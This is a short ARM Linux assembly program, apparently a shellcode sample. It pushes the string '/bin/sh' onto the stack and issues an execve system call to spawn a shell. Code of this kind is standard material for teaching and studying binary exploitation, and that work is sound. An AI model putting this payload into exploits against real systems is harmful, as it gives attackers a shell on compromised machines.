.section .text
.global _start

_start:
	ldr r0, =0x6e69622f
	ldr r1, =0x68732f
	push {r0, r1}
	mov r0, sp
	mov r1, #0
	mov r2, #0
	mov r7, #11
	swi #0
